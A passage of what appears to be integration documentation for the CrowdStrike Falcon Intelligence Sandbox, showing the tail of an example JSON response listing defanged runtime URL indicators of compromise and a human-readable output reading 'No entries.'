                    "type": "url"
                },
                {
                    "ioc": "hxxp://win32.cc",
                    "source": "runtime",
                    "type": "url"
                },
                {
                    "ioc": "hxxp://worker.cc",
                    "source": "runtime",
                    "type": "url"
                },
                {
                    "ioc": "hxxp://writable.cc",
                    "source": "runtime",
                    "type": "url"
                },
                {
                    "ioc": "hxxp://writer.cc",
                    "source": "runtime",
                    "type": "url"
                }
            ]
        ]
    }
}
```

#### Human Readable Output

>### CrowdStrike Falcon Intelligence Sandbox response:
>**No entries.**
